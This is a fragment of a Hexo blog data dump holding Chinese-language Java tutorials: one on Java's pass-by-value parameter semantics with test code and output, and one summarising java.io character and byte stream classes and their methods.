class=\"headerlink\" title=\"4.疑惑: 传地址为什么是传值，而不是传引用？\"></a>4.疑惑: 传地址为什么是传值，而不是传引用？</h3><p><a href=\"https://www.zhihu.com/question/31203609\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/31203609</a><br>知乎高赞讲解，一看就懂。<br></p>\n<h4 id=\"1-类型区别\"><a href=\"#1-类型区别\" class=\"headerlink\" title=\"(1)类型区别\"></a>(1)类型区别</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int num = 10; //基本类型</span><br><span class=\"line\">String str = &quot;hello&quot;; //引用类型</span><br></pre></td></tr></table></figure>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer1.jpg\" alt=\"transfer1\"><br>如图：num是基本类型，值就直接保存在变量中。而str是引用类型，变量中保存的只是实际对象的地址。一般称这种变量为”引用”，引用指向实际对象，实际对象中保存着内容。</p>\n<h4 id=\"2-赋值的作用\"><a href=\"#2-赋值的作用\" class=\"headerlink\" title=\"(2)= 赋值的作用\"></a>(2)= 赋值的作用</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num = 20;</span><br><span class=\"line\">str = &quot;java&quot;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer2.jpg\" alt=\"transfer2\"><br>对于基本类型 num ，赋值运算符会直接改变变量的值，原来的值被覆盖掉。<br>对于引用类型 str，赋值运算符会改变引用中所保存的地址，原来的地址被覆盖掉。但是原来的对象不会被改变（重要）。</p>\n<h4 id=\"3-调用方法时的参数传递\"><a href=\"#3-调用方法时的参数传递\" class=\"headerlink\" title=\"(3).调用方法时的参数传递\"></a>(3).调用方法时的参数传递</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StringBuilder sb = new StringBuilder(&quot;iphone&quot;);</span><br><span class=\"line\">void foo(StringBuilder builder) &#123;</span><br><span class=\"line\">    builder.append(&quot;4&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(sb); // sb 被改变了，变成了&quot;iphone4&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">StringBuilder sb = new StringBuilder(&quot;iphone&quot;);</span><br><span class=\"line\">void foo(StringBuilder builder) &#123;</span><br><span class=\"line\">    builder = new StringBuilder(&quot;ipad&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(sb); // sb 没有被改变，还是 &quot;iphone&quot;。</span><br></pre></td></tr></table></figure>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer3.jpg\" alt=\"transfer3\"><br>引用类型时，传递了变量的一份拷贝，(存储着地址的值)，然后进行修改操作后，修改了地址中的信息.</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer4.jpg\" alt=\"transfer4\"><br>new StringBuilder()时，创建了一个新的地址，原地址信息还是没有改变.</p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://blog.csdn.net/jiangnan2014/article/details/22944075\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/jiangnan2014/article/details/22944075</a></p>\n<p><a href=\"https://juejin.im/post/5bce68226fb9a05ce46a0476\" target=\"_blank\" rel=\"noopener\">https://juejin.im/post/5bce68226fb9a05ce46a0476</a></p>\n<h2 id=\"1-参数传递\"><a href=\"#1-参数传递\" class=\"headerlink\" title=\"1.参数传递\"></a>1.参数传递</h2><p>参数传递分为引用传递和值传递.</p>\n<ul>\n<li>值传递</li>\n</ul>\n<p>方法接收的是调用着提供的值</p>\n<ul>\n<li>引用传递</li>\n</ul>\n<p>方法接收的是调用者提供的变量地址</p>\n<p>这里我们需要注意的是一个方法可以修改 引用传递 所对应的变量值，而不能修改 值传递 所对应的变量值，这是按值调用与引用调用的根本区别。</p>\n<h2 id=\"2-Java中的参数传递\"><a href=\"#2-Java中的参数传递\" class=\"headerlink\" title=\"2.Java中的参数传递\"></a>2.Java中的参数传递</h2><h3 id=\"1-例子\"><a href=\"#1-例子\" class=\"headerlink\" title=\"1.例子:\"></a>1.例子:</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class MyTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    class User&#123;</span><br><span class=\"line\">        private String userName;</span><br><span class=\"line\">        private String userId;</span><br><span class=\"line\"></span><br><span class=\"line\">        public void setUserName(String userName)&#123;</span><br><span class=\"line\">            this.userName = userName;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public void setUserId(String userId)&#123;</span><br><span class=\"line\">            this.userId = userId;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        public String getUser()&#123;</span><br><span class=\"line\">           return &quot;name: &quot; + this.userName + &quot;  id: &quot; + this.userId;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest(User user)&#123;</span><br><span class=\"line\">        user.setUserName(&quot;传递&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest2(int value)&#123;</span><br><span class=\"line\">        value = value * 2;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest3(String value)&#123;</span><br><span class=\"line\">        value = value  + &quot;-changed&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest4(StringBuffer value)&#123;</span><br><span class=\"line\">        value.append(&quot;-changed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void transTest5(char ch)&#123;</span><br><span class=\"line\">        ch = &apos;2&apos;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试1</span><br><span class=\"line\">        User user = new MyTest().new User();</span><br><span class=\"line\">        user.setUserId(&quot;01&quot;);</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + user.getUser());</span><br><span class=\"line\">        transTest(user);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + user.getUser());</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试2</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        int num = 2;</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + num);</span><br><span class=\"line\">        transTest2(num);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + num);</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试3</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        String s = &quot;123&quot;;</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + s);</span><br><span class=\"line\">        transTest3(s);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + s);</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试4</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        StringBuffer sb = new StringBuffer(&quot;123&quot;);</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + sb.toString());</span><br><span class=\"line\">        transTest4(sb);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + sb);</span><br><span class=\"line\"></span><br><span class=\"line\">        //测试5</span><br><span class=\"line\">        System.out.println();</span><br><span class=\"line\">        char ch = &apos;1&apos;;</span><br><span class=\"line\">        System.out.println(&quot;传递前的值: &quot; + ch);</span><br><span class=\"line\">        transTest5(ch);</span><br><span class=\"line\">        System.out.println(&quot;传递后的值: &quot; + ch);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">传递前的值: name: null  id: 01</span><br><span class=\"line\">传递后的值: name: 传递  id: 01</span><br><span class=\"line\"></span><br><span class=\"line\">传递前的值: 2</span><br><span class=\"line\">传递后的值: 2</span><br><span class=\"line\"></span><br><span class=\"line\">传递前的值: 123</span><br><span class=\"line\">传递后的值: 123</span><br><span class=\"line\"></span><br><span class=\"line\">传递前的值: 123</span><br><span class=\"line\">传递后的值: 123-changed</span><br><span class=\"line\"></span><br><span class=\"line\">传递前的值: 1</span><br><span class=\"line\">传递后的值: 1</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"2-结论\"><a href=\"#2-结论\" class=\"headerlink\" title=\"2.结论\"></a>2.结论</h3><p>先来结论:<br></p>\n<p>1.java的参数传递都是传值，没有传引用.<br></p>\n<p>2.对引用类型的传参，传的是引用类型的值(地址的值).<br></p>\n<h3 id=\"3-分析\"><a href=\"#3-分析\" class=\"headerlink\" title=\"3.分析\"></a>3.分析</h3><p>从结果来看:<br></p>\n<ul>\n<li>测试2和测试5</li>\n</ul>\n<p>参数基本类型参数，传的是实参的值的一个拷贝，所以传递过后，方法内部对拷贝的值进行操作，实参本身值不变。</p>\n<ul>\n<li>测试1和测试4</li>\n</ul>\n<p>参数是引用类型，传的是变量的拷贝(地址)，所以在方法内进行修改，会将对应地址的信息进行修改，在外层打印时，打印的是地址中的信息(已被修改).</p>\n<ul>\n<li>测试3</li>\n</ul>\n<p>参数是引用类型，但是String不可变，对String的修改会新建一个对象.</p>\n<h3 id=\"4-疑惑-传地址为什么是传值，而不是传引用？\"><a href=\"#4-疑惑-传地址为什么是传值，而不是传引用？\" class=\"headerlink\" title=\"4.疑惑: 传地址为什么是传值，而不是传引用？\"></a>4.疑惑: 传地址为什么是传值，而不是传引用？</h3><p><a href=\"https://www.zhihu.com/question/31203609\" target=\"_blank\" rel=\"noopener\">https://www.zhihu.com/question/31203609</a><br>知乎高赞讲解，一看就懂。<br></p>\n<h4 id=\"1-类型区别\"><a href=\"#1-类型区别\" class=\"headerlink\" title=\"(1)类型区别\"></a>(1)类型区别</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int num = 10; //基本类型</span><br><span class=\"line\">String str = &quot;hello&quot;; //引用类型</span><br></pre></td></tr></table></figure>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer1.jpg\" alt=\"transfer1\"><br>如图：num是基本类型，值就直接保存在变量中。而str是引用类型，变量中保存的只是实际对象的地址。一般称这种变量为”引用”，引用指向实际对象，实际对象中保存着内容。</p>\n<h4 id=\"2-赋值的作用\"><a href=\"#2-赋值的作用\" class=\"headerlink\" title=\"(2)= 赋值的作用\"></a>(2)= 赋值的作用</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num = 20;</span><br><span class=\"line\">str = &quot;java&quot;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer2.jpg\" alt=\"transfer2\"><br>对于基本类型 num ，赋值运算符会直接改变变量的值，原来的值被覆盖掉。<br>对于引用类型 str，赋值运算符会改变引用中所保存的地址，原来的地址被覆盖掉。但是原来的对象不会被改变（重要）。</p>\n<h4 id=\"3-调用方法时的参数传递\"><a href=\"#3-调用方法时的参数传递\" class=\"headerlink\" title=\"(3).调用方法时的参数传递\"></a>(3).调用方法时的参数传递</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">StringBuilder sb = new StringBuilder(&quot;iphone&quot;);</span><br><span class=\"line\">void foo(StringBuilder builder) &#123;</span><br><span class=\"line\">    builder.append(&quot;4&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(sb); // sb 被改变了，变成了&quot;iphone4&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">StringBuilder sb = new StringBuilder(&quot;iphone&quot;);</span><br><span class=\"line\">void foo(StringBuilder builder) &#123;</span><br><span class=\"line\">    builder = new StringBuilder(&quot;ipad&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(sb); // sb 没有被改变，还是 &quot;iphone&quot;。</span><br></pre></td></tr></table></figure>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer3.jpg\" alt=\"transfer3\"><br>引用类型时，传递了变量的一份拷贝，(存储着地址的值)，然后进行修改操作后，修改了地址中的信息.</p>\n<p><img src=\"http://67.216.218.49:8000/file/blogs/java/base/paramsTransfer4.jpg\" alt=\"transfer4\"><br>new StringBuilder()时，创建了一个新的地址，原地址信息还是没有改变.</p>\n"},{"title":"输入输出流","date":"2019-04-26T17:22:34.000Z","_content":"### 一.整体概念\nJava.io 包含几乎所有的java的输入输出类\n\n先来一张 [菜鸟教程](http://www.runoob.com/java/java-files-io.html) 的图片<br>\n![io](http://67.216.218.49:8000/file/blogs/java/io/iostream.png)\n\n再来一张 [csdn](http://www.runoob.com/java/java-files-io.html) (推荐，写得很好)简化的图片<br>\n![io2](http://67.216.218.49:8000/file/blogs/java/io/iostream2.png)\n\njava中io流分字节流与字符流两种。\n\n字符流:\n\nReader 和 Writer 为字符流抽象基类，提供基本抽象方法。<br>\nInputStreamReader 和 OutputStreamWriter 为字符转换流，目的是将字节流转化为字符流。<br>\nBufferdReader 和 BufferdWriter 字符缓冲流，高效的从字符流中读取文不。<br>\nFileReader 和 FileWriter 为 InputStreamReader 和 OutputStreamWriter 的子类，特意用来读写文件。<br>\n\n字节流:\n\nInputStream 和 OutputStream 为字节流抽象基类，抽象基本方法。<br>\nFileInputStream 和 FileOutputStream 为文件字节流，读写文件原始字节。<br>\nBufferdInputStream 和 BufferdOutputStream 为字节缓冲流，利用缓冲区，提高读写效率。<br>\n\n### 二.具体方法\n#### 1.字符流\n\nReader:\n\n```\npublic abstract class Reader implements Readable, Closeable {\n    //将字符读入缓冲区\n    public int read(java.nio.CharBuffer target)\n    //读取字符(单个)\n    public int read()\n    //将字符读入数组\n    public int read(char cbuf[])\n    //将字符读入数组某个部分\n    abstract public int read(char cbuf[], int off, int len)\n    //跳过某些字符\n    public long skip(long n)\n    //是否准备好读取\n    public boolean ready()\n    //是否支持mark操作\n    public boolean markSupported() {...}\n    //mark\n    public void mark(int readAheadLimit)\n    //重置流\n    public void reset()\n    //关闭\n    abstract public void close() throws IOException;\n}\n```\n\nInputStreamReader:\n\n```\npublic class InputStreamReader extends Reader {\n    //构造方法,默认/字符集名称/字符集/字符集解码器\n    public InputStreamReader(InputStream in)\n    public InputStreamReader(InputStream in, String charsetName)\n    public InputStreamReader(InputStream in, Charset cs)\n    public InputStreamReader(InputStream in, CharsetDecoder dec)\n    //扩展方法\n    public String getEncoding()\n}\n```\n\nBufferdReader:\n\n```\npublic class BufferedReader extends Reader {\n    //构造器，默认/自定义buffer大小\n    public BufferedReader(Reader in)\n    public BufferedReader(Reader in, int sz)\n    //特有方法\n    //确保流未被关闭\n    private void ensureOpen()\n    //读取一行\n    public String readLine()\n    //以流的形式返回一行\n    public Stream<String> lines()\n}\n```\n\nFileReader:\n\n```\npublic class FileReader extends InputStreamReader {\n    //构造方法\n    public FileReader(String fileName)\n    public FileReader(File file)\n    public FileReader(FileDescriptor fd)\n}\n```\n\nWriter:\n\n```\npublic abstract class Writer implements Appendable, Closeable, Flushable {\n    //写入单个字符\n    public void write(int c)\n    //写入数组内所有字符\n    public void write(char cbuf[])\n    //写入一部分\n    abstract public void write(char cbuf[], int off, int len)\n    //写字符串\n    public void write(String str)\n    public void write(String str, int off, int len)\n    //追加字符序列\n    public Writer append(CharSequence csq)\n    public Writer append(CharSequence csq, int start, int end)\n    //追究字符\n    public Writer append(char c)\n    //刷新整个流\n    abstract public void flush()\n    //关闭\n    abstract public void close()\n}\n```\n\nOutputStreamWriter:\n\n```\npublic class OutputStreamWriter extends Writer {\n    //构造方法，默认/字符集名/字符集/字符集编码器\n    public OutputStreamWriter(OutputStream out)\n    public OutputStreamWriter(OutputStream out, String charsetName)\n    public OutputStreamWriter(OutputStream out, Charset cs)\n    public OutputStreamWriter(OutputStream out, CharsetEncoder enc)\n    //特有方法\n    public String getEncoding()\n    //刷新buffer\n    void flushBuffer()\n}\n```\n\nBufferdWriter:\n\n```\npublic class BufferedWriter extends Writer {\n    //构造器，默认大小/缓冲区大小\n    public BufferedWriter(Writer out)\n    public BufferedWriter(Writer out, int sz)\n    //特有\n    //换行\n    public void newLine()\n    //刷新缓冲区  \n    void flushBuffer()\n}\n```\n\nFileWriter:\n\n```\npublic class FileWriter extends OutputStreamWriter{\n    //构造器\n    public FileWriter(String fileName)\n    //是否追加的方式写入文件\n    public FileWriter(String fileName, boolean append)\n    public FileWriter(File file)\n    public FileWriter(FileDescriptor fd)\n}\n```\n#### 2.字节流\nInputStream:\n\n```\npublic abstract class InputStream implements Closeable {\n    //从输入流中读取下一个字节byte\n    public abstract int read()\n    //从输入流中读取一定数量字节到数组中\n    public int read(byte b[])\n    //读取输入流中len个字节\n    public int read(byte b[], int off, int len)\n    //跳过\n    public long skip(long n)\n    //输入流是否可读取\n    public int available()\n    //关闭\n    public void close()\n    //是否支持reset方法\n    public boolean markSupported()\n}\n```\n\nFileInputStream:\n\n```\nclass FileInputStream extends InputStream{\n    //构造器\n    public FileInputStream(String name)\n    public FileInputStream(File file)\n    public FileInputStream(FileDescriptor fdObj)\n}\n```\n\nBufferdInputStream:\n\n```\nclass BufferedInputStream extends FilterInputStream {\n    //构造器\n    public BufferedInputStream(InputStream in)\n    public BufferedInputStream(InputStream in, int size)\n}  \n```\n\nOutputStream:\n\n```\npublic abstract class OutputStream implements Closeable, Flushable{\n    //写入\n    public abstract void write(int b)\n    //将数组内的字符写入\n    public void write(byte b[])\n    //将数组内特定部分字符写入\n    public void write(byte b[], int off, int len)\n    //刷新\n    public void flush()\n    //关闭\n    public void close()\n}\n```\n\nFileOutputStream:\n\n```\npublic class FileOutputStream extends OutputStream{\n    //构造器\n    public FileOutputStream(String name)\n    public FileOutputStream(String name, boolean append)\n    public FileOutputStream(File file)\n    public FileOutputStream(File file, boolean append)\n    public FileOutputStream(FileDescriptor fdObj)\n}\n```\n\nBufferdOutputStream:\n\n```\npublic class BufferedOutputStream extends FilterOutputStream {\n    //构造器\n    public BufferedOutputStream(OutputStream out)\n    public BufferedOutputStream(OutputStream out, int size)\n}\n```\n### 三.实际例子\n读取socket发送过来的字节流\n\n```\n//1.客户端发过来的字节流 socket.getInputStream()\n//2.字节流转为字符流 InputStreamReader()\n//3.高效读写 BufferedReader()\nBufferedReader in = new BufferedReader(new InputStreamReader(\nsocket.getInputStream()));\nSystem.out.println(in.readLine());  // 打印\n```\n\n### 四.区别\n\nhttps://comp.lang.java.help.narkive.com/dKrnNGj0/what-s-the-diff-printwriter-vs-outputstreamwriter\n","source":"_posts/java/io/输入输出流.md","raw":"---\ntitle: 输入输出流\ndate: 2019-04-26 13:22:34\ntags: [java]\n---\n### 一.整体概念\nJava.io 包含几乎所有的java的输入输出类\n\n先来一张 [菜鸟教程](http://www.runoob.com/java/java-files-io.html) 的图片<br>\n![io](http://67.216.218.49:8000/file/blogs/java/io/iostream.png)\n\n再来一张 [csdn](http://www.runoob.com/java/java-files-io.html) (推荐，写得很好)简化的图片<br>\n![io2](http://67.216.218.49:8000/file/blogs/java/io/iostream2.png)\n\njava中io流分字节流与字符流两种。\n\n字符流:\n\nReader 和 Writer 为字符流抽象基类，提供基本抽象方法。<br>\nInputStreamReader 和 OutputStreamWriter 为字符转换流，目的是将字节流转化为字符流。<br>\nBufferdReader 和 BufferdWriter 字符缓冲流，高效的从字符流中读取文不。<br>\nFileReader 和 FileWriter 为 InputStreamReader 和 OutputStreamWriter 的子类，特意用来读写文件。<br>\n\n字节流:\n\nInputStream 和 OutputStream 为字节流抽象基类，抽象基本方法。<br>\nFileInputStream 和 FileOutputStream 为文件字节流，读写文件原始字节。<br>\nBufferdInputStream 和 BufferdOutputStream 为字节缓冲流，利用缓冲区，提高读写效率。<br>\n\n### 二.具体方法\n#### 1.字符流\n\nReader:\n\n```\npublic abstract class Reader implements Readable, Closeable {\n    //将字符读入缓冲区\n    public int read(java.nio.CharBuffer target)\n    //读取字符(单个)\n    public int read()\n    //将字符读入数组\n    public int read(char cbuf[])\n    //将字符读入数组某个部分\n    abstract public int read(char cbuf[], int off, int len)\n    //跳过某些字符\n    public long skip(long n)\n    //是否准备好读取\n    public boolean ready()\n    //是否支持mark操作\n    public boolean markSupported() {...}\n    //mark\n    public void mark(int readAheadLimit)\n    //重置流\n    public void reset()\n    //关闭\n    abstract public void close() throws IOException;\n}\n```\n\nInputStreamReader:\n\n```\npublic class InputStreamReader extends Reader {\n    //构造方法,默认/字符集名称/字符集/字符集解码器\n    public InputStreamReader(InputStream in)\n    public InputStreamReader(InputStream in, String charsetName)\n    public InputStreamReader(InputStream in, Charset cs)\n    public InputStreamReader(InputStream in, CharsetDecoder dec)\n    //扩展方法\n    public String getEncoding()\n}\n```\n\nBufferdReader:\n\n```\npublic class BufferedReader extends Reader {\n    //构造器，默认/自定义buffer大小\n    public BufferedReader(Reader in)\n    public BufferedReader(Reader in, int sz)\n    //特有方法\n    //确保流未被关闭\n    private void ensureOpen()\n    //读取一行\n    public String readLine()\n    //以流的形式返回一行\n    public Stream<String> lines()\n}\n```\n\nFileReader:\n\n```\npublic class FileReader extends InputStreamReader {\n    //构造方法\n    public FileReader(String fileName)\n    public FileReader(File file)\n    public FileReader(FileDescriptor fd)\n}\n```\n\nWriter:\n\n```\npublic abstract class Writer implements Appendable, Closeable, Flushable {\n    //写入单个字符\n    public void write(int c)\n    //写入数组内所有字符\n    public void write(char cbuf[])\n    //写入一部分\n    abstract public void write(char cbuf[], int off, int len)\n    //写字符串\n    public void write(String str)\n    public void write(String str, int off, int len)\n    //追加字符序列\n    public Writer append(CharSequence csq)\n    public Writer append(CharSequence csq, int start, int end)\n    //追究字符\n    public Writer append(char c)\n    //刷新整个流\n    abstract public void flush()\n    //关闭\n    abstract public void close()\n}\n```\n\nOutputStreamWriter:\n\n```\npublic class OutputStreamWriter extends Writer {\n    //构造方法，默认/字符集名/字符集/字符集编码器\n    public OutputStreamWriter(OutputStream out)\n    public OutputStreamWriter(OutputStream out, String charsetName)\n    public OutputStreamWriter(OutputStream out, Charset cs)\n    public OutputStreamWriter(OutputStream out, CharsetEncoder enc)\n    //特有方法\n    public String getEncoding()\n    //刷新buffer\n    void flushBuffer()\n}\n```\n\nBufferdWriter:\n\n```\npublic class BufferedWriter extends Writer {\n    //构造器，默认大小/缓冲区大小\n    public BufferedWriter(Writer out)\n    public BufferedWriter(Writer out, int sz)\n    //特有\n    //换行\n    public void newLine()\n    //刷新缓冲区  \n    void flushBuffer()\n}\n```\n\nFileWriter:\n\n```\npublic class FileWriter extends OutputStreamWriter{\n    //构造器\n    public FileWriter(String fileName)\n    //是否追加的方式写入文件\n    public FileWriter(String fileName, boolean append)\n    public FileWriter(File file)\n    public FileWriter(FileDescriptor fd)\n}\n```\n#### 2.字节流\nInputStream:\n\n```\npublic abstract class InputStream implements Closeable {\n    //从输入流中读取下一个字节byte\n    public abstract int read()\n    //从输入流中读取一定数量字节到数组中\n    public int read(byte b[])\n    //读取输入流中len个字节\n    public int read(byte b[], int off, int len)\n    //跳过\n    public long skip(long n)\n    //输入流是否可读取\n    public int available()\n    //关闭\n    public void close()\n    //是否支持reset方法\n    public boolean markSupported()\n}\n```\n\nFileInputStream:\n\n```\nclass FileInputStream extends InputStream{\n    //构造器\n    public FileInputStream(String name)\n    public FileInputStream(File file)\n    public FileInputStream(FileDescriptor fdObj)\n}\n```\n\nBufferdInputStream:\n\n```\nclass BufferedInputStream extends FilterInputStream {\n    //构造器\n    public BufferedInputStream(InputStream in)\n    public BufferedInputStream(InputStream in, int size)\n}  \n```\n\nOutputStream:\n\n```\npublic abstract class OutputStream implements Closeable, Flushable{\n    //写入\n    public abstract void write(int b)\n    //将数组内的字符写入\n    public void write(byte b[])\n    //将数组内特定部分字符写入\n    public void write(byte b[], int off, int len)\n    //刷新\n    public void flush()\n    //关闭\n    public void close()\n}\n```\n\nFileOutputStream:\n\n```\npublic class FileOutputStream extends OutputStream{\n    //构造器\n    public FileOutputStream(String name)\n    public FileOutputStream(String name, boolean append)\n    public FileOutputStream(File file)\n    public FileOutputStream(File file, boolean append)\n    public FileOutputStream(FileDescriptor fdObj)\n}\n```\n\nBufferdOutputStream:\n\n```\npublic class BufferedOutputStream extends FilterOutputStream {\n    //构造器\n    public BufferedOutputStream(OutputStream out)\n    public BufferedOutputStream(OutputStream out, int size)\n}\n```\n### 三.实际例子\n读取socket发送过来的字节流\n\n```\n//1.客户端发过来的字节流 socket.getInputStream()\n//2.字节流转为字符流 InputStreamReader()\n//3.高效读写 BufferedReader()\nBufferedReader in = new BufferedReader(new InputStreamReader(\nsocket.getInputStream()));\nSystem.out.println(in.readLine());  // 打印\n```\n\n### 四.区别\n\nhttps://comp.lang.java.help.narkive.com/dKrnNGj0/what-s-the-diff-printwriter-vs-outputstreamwriter\n","slug":"java/io/输入输出流","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lj004a6dcpjxx5dy1d","content":"<h3 id=\"一-整体概念\"><a href=\"#一-整体概念\" class=\"headerlink\" title=\"一.整体概念\"></a>一.整体概念</h3><p>Java.io 包含几乎所有的java的输入输出类</p>\n<p>先来一张 <a href=\"http://www.runoob.com/java/java-files-io.html\" target=\"_blank\" rel=\"noopener\">菜鸟教程</a> 的图片<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/io/iostream.png\" alt=\"io\"></p>\n<p>再来一张 <a href=\"http://www.runoob.com/java/java-files-io.html\" target=\"_blank\" rel=\"noopener\">csdn</a> (推荐，写得很好)简化的图片<br><br><img src=\"http://67.216.218.49:8000/file/blogs/java/io/iostream2.png\" alt=\"io2\"></p>\n<p>java中io流分字节流与字符流两种。</p>\n<p>字符流:</p>\n<p>Reader 和 Writer 为字符流抽象基类，提供基本抽象方法。<br><br>InputStreamReader 和 OutputStreamWriter 为字符转换流，目的是将字节流转化为字符流。<br><br>BufferdReader 和 BufferdWriter 